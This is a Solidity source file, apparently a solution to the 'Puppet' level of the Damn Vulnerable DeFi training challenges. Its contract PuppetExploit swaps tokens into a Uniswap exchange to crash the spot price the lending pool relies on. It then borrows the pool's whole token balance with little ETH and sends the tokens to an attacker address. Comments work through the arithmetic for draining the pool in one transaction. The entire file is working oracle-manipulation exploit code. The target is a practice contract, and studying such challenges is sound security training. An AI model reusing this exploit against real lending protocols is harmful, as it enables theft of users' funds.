// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";
import "./UniswapInterface.sol";

contract PuppetExploit{

    using Address for address payable;

    UniswapExchange public uniswapPairExchange;
    DamnValuableToken public immutable token;
    PuppetPool public puppetPool;
    address public attacker;

    constructor (address tokenAddress, address uniswapPairAddress, address puppetPoolAddress, address _attacker) {
        token = DamnValuableToken(tokenAddress);
        uniswapPairExchange = UniswapExchange(uniswapPairAddress);
        puppetPool = PuppetPool(puppetPoolAddress);
        attacker = _attacker;
    }

    //In theory, we would need to loop over line 35 to 44 until all the funds are drained, but we manage to drain the funds in one go
    function pwn(uint256 tokenBalanceToTransfer) public payable {
        //Get tokens and approve transfer to uniswap
        require(token.transferFrom(attacker, address(this), tokenBalanceToTransfer), "Could not get all the tokens!");
        require(token.approve(address(uniswapPairExchange), tokenBalanceToTransfer), "Could not approve Exchange!");
        
        //Swap all tokens for ETH, so we create an inbalance in the pool that causes very low prices
        //The value "tokenBalanceToTransfer - 1" is a result of the success conditions having an amount _greater_ than
        //the exchange's funds, therefore don't convert entire balance (you could also keep 1 token in attacker-address)
        uint256 amountEth = uniswapPairExchange.tokenToEthSwapInput(tokenBalanceToTransfer - 1, 1, block.timestamp + 60);
    
        //calculate how many tokens we can borrow with given funds
        uint256 currentMaxBorrow = calculateMaxBorrow();
        
        //Don't "over-drain" the pool, else we revert
        if(currentMaxBorrow > token.balanceOf(address(puppetPool))){
            currentMaxBorrow = token.balanceOf(address(puppetPool));
        }
        puppetPool.borrow{value: amountEth + msg.value}(currentMaxBorrow);
        
        //transfer back to attacker-address
        token.transfer(attacker, token.balanceOf(address(this)));
    }


    // Solve the original equation from PuppetPool for amount instead of required, so we can get 
    // convert our entire eth-balance into the tokens in one tx.
    //      required =  amount * _computeOraclePrice() * 2 / 10 ** 18; // required = <all the funds I have>
    //<=>   amount = <all the funds I have> * 10** 18 / 2 / _computeOraclePrice()
    function calculateMaxBorrow() private view returns(uint256) {        
        uint256 amount = address(this).balance * 10** 18 / 2 / _computeOraclePrice();
        return amount;
    }

    //copied from PuppetPool.sol
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return address(uniswapPairExchange).balance * (10 ** 18) / token.balanceOf(address(uniswapPairExchange));
    }

    receive() external payable{}
}
